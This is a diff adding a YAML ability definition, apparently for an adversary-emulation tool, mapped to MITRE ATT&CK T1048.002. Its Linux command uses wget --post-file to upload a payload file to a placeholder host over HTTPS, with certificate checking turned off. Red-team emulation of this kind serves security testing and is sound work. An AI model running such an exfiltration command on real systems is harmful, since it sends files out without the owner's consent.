@@ -1,0 +1,18 @@
+- description: 'Exfiltrate data over HTTPS using wget --post-file method
+
+    '
+  id: 001e7bd5-a65a-49fa-ed2a-68e1c541d7a9
+  name: Exfiltrate data in a file over HTTPS using wget
+  platforms:
+    linux:
+      sh:
+        cleanup: ''
+        command: wget --post-file="3945c9_artifact" --timeout=5 --no-check-certificate
+          https://example.com/ --delete-after
+        payloads:
+        - 3945c9_artifact
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.002
+    name: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted
+      Non-C2 Protocol
